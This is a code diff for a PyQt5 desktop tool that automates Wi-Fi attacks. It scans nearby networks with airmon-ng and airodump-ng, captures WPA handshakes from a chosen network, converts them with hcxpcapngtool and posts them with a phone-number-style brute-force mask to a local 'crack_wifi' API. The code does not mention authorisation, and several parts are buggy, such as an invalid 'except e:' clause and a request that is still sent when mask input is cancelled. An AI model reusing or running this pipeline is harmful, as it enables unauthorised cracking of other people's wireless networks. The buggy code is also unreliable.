@@ -4,11 +4,14 @@ import os
 import time
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QListWidget, QPushButton, QStackedWidget, QLabel,
-                            QListWidgetItem)
+                            QListWidgetItem, QInputDialog, QMessageBox, QHBoxLayout,
+                            QRadioButton, QGridLayout, QHeaderView)
 from PyQt5.QtCore import Qt, QTimer
+from PyQt5.QtWidgets import QTableWidget, QTableWidgetItem
 import re
 import glob
 import shutil
+import requests
 
 class NetworkListItem(QListWidgetItem):
     def __init__(self, bssid, channel, essid):
@@ -31,6 +34,7 @@ class NetworkMonitor(QMainWindow):
         self.scanning_process = None
         self.monitoring_timer = QTimer()
         self.monitoring_timer.timeout.connect(self.update_stations)
+        self.selected_network = None
         
         # Create stacked widget for multiple pages
         self.stacked_widget = QStackedWidget()
@@ -48,8 +52,22 @@ class NetworkMonitor(QMainWindow):
         title.setAlignment(Qt.AlignCenter)
         layout.addWidget(title)
         
-        self.network_list = QListWidget()
-        layout.addWidget(self.network_list)
+        # Create table widget instead of list widget
+        self.network_table = QTableWidget()
+        self.network_table.setColumnCount(4)  # Radio, BSSID, Channel, ESSID
+        self.network_table.setHorizontalHeaderLabels(["Select", "BSSID", "Channel", "ESSID"])
+        header = self.network_table.horizontalHeader()
+        header.setSectionResizeMode(0, QHeaderView.ResizeToContents)
+        header.setSectionResizeMode(1, QHeaderView.Stretch)
+        header.setSectionResizeMode(2, QHeaderView.ResizeToContents)
+        header.setSectionResizeMode(3, QHeaderView.Stretch)
+        layout.addWidget(self.network_table)
+        
+        # Instruction label
+        self.instruction_label = QLabel("Please select a network to monitor")
+        self.instruction_label.setStyleSheet("color: red;")
+        self.instruction_label.setVisible(False)
+        layout.addWidget(self.instruction_label)
         
         scan_btn = QPushButton("Scan Networks")
         scan_btn.clicked.connect(self.scan_networks)
@@ -58,24 +76,6 @@ class NetworkMonitor(QMainWindow):
         select_btn = QPushButton("Monitor Selected Network")
         select_btn.clicked.connect(self.start_network_monitoring)
         layout.addWidget(select_btn)
-        
-        page.setLayout(layout)
-        self.stacked_widget.addWidget(page)
-        
-    def init_handshake_page(self):
-        page = QWidget()
-        layout = QVBoxLayout()
-        
-        title = QLabel("Network Connections and Handshake")
-        title.setAlignment(Qt.AlignCenter)
-        layout.addWidget(title)
-        
-        self.stations_list = QListWidget()
-        layout.addWidget(self.stations_list)
-        
-        back_btn = QPushButton("Back")
-        back_btn.clicked.connect(self.stop_monitoring_and_go_back)
-        layout.addWidget(back_btn)
         
         page.setLayout(layout)
         self.stacked_widget.addWidget(page)
@@ -103,33 +103,44 @@ class NetworkMonitor(QMainWindow):
         
         return networks
 
-    def parse_station_output(self, output):
-        stations = []
-        lines = output.split('\n')
+    def init_handshake_page(self):
+        # [Previous handshake page code remains the same]
+        page = QWidget()
+        layout = QVBoxLayout()
         
-        # Find the line that starts with "BSSID" and contains "STATION"
-        for i, line in enumerate(lines):
-            if "STATION" in line:
-                # Process station lines
-                for station_line in lines[i+1:]:
-                    if not station_line.strip():
-                        break
-                    
-                    # Parse station information
-                    parts = station_line.split()
-                    if len(parts) >= 2:
-                        station_mac = parts[1]
-                        power = parts[2] if len(parts) > 2 else "N/A"
-                        stations.append((station_mac, power))
+        title = QLabel("Network Connections and Handshake")
+        title.setAlignment(Qt.AlignCenter)
+        layout.addWidget(title)
         
-        return stations
+        self.stations_list = QListWidget()
+        layout.addWidget(self.stations_list)
+        
+        back_btn = QPushButton("Back")
+        back_btn.clicked.connect(self.stop_monitoring_and_go_back)
+        layout.addWidget(back_btn)
+        
+        page.setLayout(layout)
+        self.stacked_widget.addWidget(page)
 
+    def radio_button_clicked(self):
+        sender = self.sender()
+        if sender.isChecked():
+            row = self.network_table.indexAt(sender.pos()).row()
+            self.selected_network = {
+                'bssid': self.network_table.item(row, 1).text(),
+                'channel': self.network_table.item(row, 2).text(),
+                'essid': self.network_table.item(row, 3).text()
+            }
+            self.instruction_label.setVisible(False)
+        
     def scan_networks(self):
         try:
-            self.network_list.clear()
-            self.network_list.addItem("Scanning networks... Please wait.")
+            self.network_table.setRowCount(0)
+            self.network_table.setItem(0, 0, QTableWidgetItem("Scanning networks... Please wait."))
             QApplication.processEvents()
 
+            # [Previous scanning code remains the same until parsing networks]
+            
             # Kill conflicting processes
             subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                          capture_output=True, text=True)
@@ -155,12 +166,9 @@ class NetworkMonitor(QMainWindow):
             process.terminate()
             process.wait()
             
-            # Read the CSV file
+            # Read and parse networks
             try:
-                # Wait a moment for file to be written
                 time.sleep(1)
-                
-                # Find the created CSV file
                 csv_file = None
                 for file in os.listdir("output_files"):
                     if file.startswith("temp-scan") and file.endswith(".csv"):
@@ -170,29 +178,42 @@ class NetworkMonitor(QMainWindow):
                 if csv_file and os.path.exists(csv_file):
                     with open(csv_file, 'r', encoding='utf-8') as f:
                         content = f.read()
-                        
-                    # Parse and display networks
-                    self.network_list.clear()
+                    
+                    # Update table with networks
+                    self.network_table.setRowCount(0)
                     networks = self.parse_csv_output(content)
                     
-                    for bssid, channel, essid in networks:
-                        item = NetworkListItem(bssid, channel, essid)
-                        self.network_list.addItem(item)
+                    for i, (bssid, channel, essid) in enumerate(networks):
+                        self.network_table.insertRow(i)
+                        
+                        # Create radio button
+                        radio_widget = QWidget()
+                        radio_layout = QHBoxLayout(radio_widget)
+                        radio_button = QRadioButton()
+                        radio_button.clicked.connect(self.radio_button_clicked)
+                        radio_layout.addWidget(radio_button)
+                        radio_layout.setAlignment(Qt.AlignCenter)
+                        radio_layout.setContentsMargins(0, 0, 0, 0)
+                        radio_widget.setLayout(radio_layout)
+                        
+                        self.network_table.setCellWidget(i, 0, radio_widget)
+                        self.network_table.setItem(i, 1, QTableWidgetItem(bssid))
+                        self.network_table.setItem(i, 2, QTableWidgetItem(channel))
+                        self.network_table.setItem(i, 3, QTableWidgetItem(essid))
                     
-                    # Clean up temporary files
-                    # self.clear_output_files()
+                    self.clear_output_files()
                 else:
-                    self.network_list.clear()
-                    self.network_list.addItem("No networks found or error reading output")
+                    self.network_table.setRowCount(1)
+                    self.network_table.setItem(0, 0, QTableWidgetItem("No networks found or error reading output"))
                     
             except Exception as e:
-                self.network_list.clear()
-                self.network_list.addItem(f"Error reading scan results: {str(e)}")
+                self.network_table.setRowCount(1)
+                self.network_table.setItem(0, 0, QTableWidgetItem(f"Error reading scan results: {str(e)}"))
                 
         except Exception as e:
-            self.network_list.clear()
-            self.network_list.addItem(f"Error scanning: {str(e)}")
-    
+            self.network_table.setRowCount(1)
+            self.network_table.setItem(0, 0, QTableWidgetItem(f"Error scanning: {str(e)}"))
+
     def parse_csv_output(self, content):
         networks = []
         lines = content.split('\n')
@@ -221,19 +242,154 @@ class NetworkMonitor(QMainWindow):
                 if bssid and channel:  # Only add if we have at least BSSID and channel
                     networks.append((bssid, channel, essid))
         
-        return networks
-    
+        return networks 
+        
+    def get_mask_input(self):
+        mask, ok = QInputDialog.getText(
+            self,
+            "Enter Mask",
+            "Please enter the mask pattern:",
+            text="604?d?d?d?d?d?d?d"  # Default value
+        )
+        if ok and mask:
+            return mask
+        return None
+
+    def process_capture_files(self):
+        try:
+            # [Previous code until payload creation remains the same]
+            cap_files = glob.glob("output_files/*.cap")
+            
+            if not cap_files:
+                self.stations_list.addItem("Waiting for capture files...")
+                return False
+                
+            latest_cap = max(cap_files, key=os.path.getctime)
+            
+            if os.path.getsize(latest_cap) < 24576:
+                self.stations_list.addItem("Waiting for WPA handshake...")
+                return False
+                
+            base_name = os.path.splitext(latest_cap)[0]
+            
+            if hasattr(self, 'last_processed_cap') and self.last_processed_cap == latest_cap:
+                return False
+                
+            try:
+                subprocess.run(['which', 'hcxpcapngtool'], check=True, capture_output=True)
+            except subprocess.CalledProcessError:
+                self.stations_list.addItem("Installing hcxtools...")
+                QApplication.processEvents()
+                
+                subprocess.run(['sudo', 'apt', 'install', '-y', 'hcxtools'], check=True)
+            
+            self.stations_list.addItem("Converting capture file...")
+            QApplication.processEvents()
+            
+            try:
+                result = subprocess.run([
+                    'sudo', 'hcxpcapngtool',
+                    '-o', f"{base_name}.pcap",
+                    latest_cap
+                ], capture_output=True, text=True, check=True)
+                
+                if not os.path.exists(f"{base_name}.pcap") or os.path.getsize(f"{base_name}.pcap") == 0:
+                    self.stations_list.addItem("No valid handshake found yet...")
+                    return False
+                    
+                self.last_processed_cap = latest_cap
+                
+                with open(f"{base_name}.pcap", 'rb') as f:
+                    handshake_string = f.read().hex()
+                
+                # Get mask input from user
+                mask = self.get_mask_input()
+                if not mask:
+                    self.stations_list.addItem("Mask input cancelled...")
+                    # return 
+
+                ######
+                
+                # Send to API
+                self.stations_list.addItem("Sending data to API...")
+                QApplication.processEvents()
+                
+                # Prepare API request
+                payload = {
+                    "handshake": handshake_string,
+                    "mask": mask
+                }
+                
+                try:
+
+                    response = requests.post(
+                        'http://localhost:5000/crack_wifi',
+                        data=payload
+                    )
+                    
+                    if response.status_code == 200:
+                        self.stations_list.addItem("Data sent successfully to API")
+                        self.stations_list.addItem("API result:",response)
+                    else:
+                        self.stations_list.addItem(
+                            f"API Error: {response.status_code} - {response.text}"
+                        )
+                except e:
+                    print("Response exception:",e)
+            
+                print("payload data:", payload)
+                
+                ######
+                self.stations_list.addItem("Successfully captured handshake!")
+                return True
+                
+            except subprocess.CalledProcessError as e:
+                if "No network traffic collected" in e.stderr:
+                    self.stations_list.addItem("Waiting for network traffic...")
+                else:
+                    self.stations_list.addItem("No valid handshake captured yet...")
+                return False
+            except requests.RequestException as e:
+                self.stations_list.addItem(f"API request error: {str(e)}")
+
+        except Exception as e:
+            self.stations_list.addItem(f"Processing error: {str(e)}")
+            return False
+        finally:
+            QApplication.processEvents()
+
+    def parse_station_output(self, output):
+        stations = []
+        lines = output.split('\n')
+        
+        # Find the line that starts with "BSSID" and contains "STATION"
+        for i, line in enumerate(lines):
+            if "STATION" in line:
+                # Process station lines
+                for station_line in lines[i+1:]:
+                    if not station_line.strip():
+                        break
+                    
+                    # Parse station information
+                    parts = station_line.split()
+                    if len(parts) >= 2:
+                        station_mac = parts[1]
+                        power = parts[2] if len(parts) > 2 else "N/A"
+                        stations.append((station_mac, power))
+        
+        return stations
+
     def start_network_monitoring(self):
-        current_item = self.network_list.currentItem()
-        if not current_item or not isinstance(current_item, NetworkListItem):
+        if not self.selected_network:
+            self.instruction_label.setVisible(True)
             return
         
-        self.current_bssid = current_item.bssid
-        self.current_channel = current_item.channel
-        self.current_essid = current_item.essid
+        self.current_bssid = self.selected_network['bssid']
+        self.current_channel = self.selected_network['channel']
+        self.current_essid = self.selected_network['essid']
         
         # Clear output files directory
-        # self.clear_output_files()
+        self.clear_output_files()
         
         # Start monitoring
         self.start_station_monitoring()
@@ -243,7 +399,7 @@ class NetworkMonitor(QMainWindow):
         
         # Start periodic updates
         self.monitoring_timer.start(30000)  # 30 seconds
-        
+
     def clear_output_files(self):
         """Clear all files in the output_files directory"""
         try:
@@ -257,7 +413,7 @@ class NetworkMonitor(QMainWindow):
                         print(f"Error deleting {file_path}: {e}")
         except Exception as e:
             print(f"Error clearing output files: {e}")
-    
+
     def start_station_monitoring(self):
         try:
             self.stations_list.clear()
@@ -267,17 +423,8 @@ class NetworkMonitor(QMainWindow):
             # Create base output filename
             output_file = f"output_files/{self.current_essid}.out"
             
-            # Kill any existing monitoring process
-            if self.scanning_process:
-                self.scanning_process.terminate()
-                try:
-                    self.scanning_process.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    self.scanning_process.kill()
-                self.scanning_process = None
-            
-            # Start new monitoring process with all file generation
-            print("Executing dump for bssid:",self.current_bssid,len(self.current_bssid)," channel:",self.current_channel)
+            # Start new monitoring process
+            print("Executing dump for bssid:", self.current_bssid, " channel:", self.current_channel)
             command = [
                 'sudo', 'airodump-ng',
                 '-c', self.current_channel,
@@ -291,96 +438,17 @@ class NetworkMonitor(QMainWindow):
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-            
-            # Give it a moment to start collecting data
-            time.sleep(2)
+            if self.scanning_process:
+                print("Successfully started monitoring!")
+                self.stations_list.addItem("Monitoring started. Waiting for handshake...")
             
             # Initial station update
             self.update_stations()
             
-            # Start processing capture files
-            self.process_capture_files()
-            
         except Exception as e:
             self.stations_list.clear()
             self.stations_list.addItem(f"Error monitoring: {str(e)}")
-    
-    def process_capture_files(self):
-        try:
-            # Find .cap files
-            cap_files = glob.glob("output_files/*.cap")
-            
-            if not cap_files:
-                print("No .cap files found yet")
-                return
-                
-            # Get the most recent .cap file
-            latest_cap = max(cap_files, key=os.path.getctime)
-            base_name = os.path.splitext(latest_cap)[0]
-            
-            # Install hcxtools if not already installed
-            try:
-                subprocess.run(['which', 'hcxpcapngtool'], 
-                             check=True, 
-                             capture_output=True)
-            except subprocess.CalledProcessError:
-                self.stations_list.addItem("Installing hcxtools...")
-                QApplication.processEvents()
-                
-                subprocess.run(['sudo', 'apt', 'install', '-y', 'hcxtools'],
-                             check=True)
-            
-            # Convert cap to pcap
-            self.stations_list.addItem("Converting capture file...")
-            time.sleep(4)
-            QApplication.processEvents()
-            
-            subprocess.run([
-                'sudo', 'hcxpcapngtool',
-                latest_cap,
-                '-o', f"{base_name}.pcap"
-            ], check=True)
-            
-            time.sleep(5)
 
-            # Read the pcap file content
-            with open(f"{base_name}.pcap", 'rb') as f:
-                handshake_string = f.read().hex()
-            
-            # Prepare API request
-            payload = {
-                "handshake": handshake_string,
-                "mask": "604?d?d?d?d?d?d?d"
-            }
-            
-            # Send to API
-            self.stations_list.addItem("Sending data to API...")
-            QApplication.processEvents()
-            
-            '''
-            response = requests.post(
-                'http://localhost:5000/crack_wifi',
-                json=payload
-            )
-            
-            if response.status_code == 200:
-                self.stations_list.addItem("Data sent successfully to API")
-            else:
-                self.stations_list.addItem(
-                    f"API Error: {response.status_code} - {response.text}"
-                )
-            '''
-            print("payload data:", payload)
-            
-        except subprocess.CalledProcessError as e:
-            self.stations_list.addItem(f"Command execution error: {str(e)}")
-        # except requests.RequestException as e:
-        #     self.stations_list.addItem(f"API request error: {str(e)}")
-        except Exception as e:
-            self.stations_list.addItem(f"Processing error: {str(e)}")
-        finally:
-            QApplication.processEvents()
-    
     def update_stations(self):
         try:
             # Find the most recent CSV file
@@ -413,11 +481,12 @@ class NetworkMonitor(QMainWindow):
                     self.stations_list.addItem(station_info)
             
             # Process capture files after updating stations
-            self.process_capture_files()
+            # Only show "waiting" message if processing hasn't succeeded
+            if not self.process_capture_files():
+                self.stations_list.addItem("Waiting for WPA handshake...")
                 
         except Exception as e:
             self.stations_list.addItem(f"Error updating stations: {str(e)}")
-    
     def parse_stations_from_csv(self, content):
         stations = []
         lines = content.split('\n')
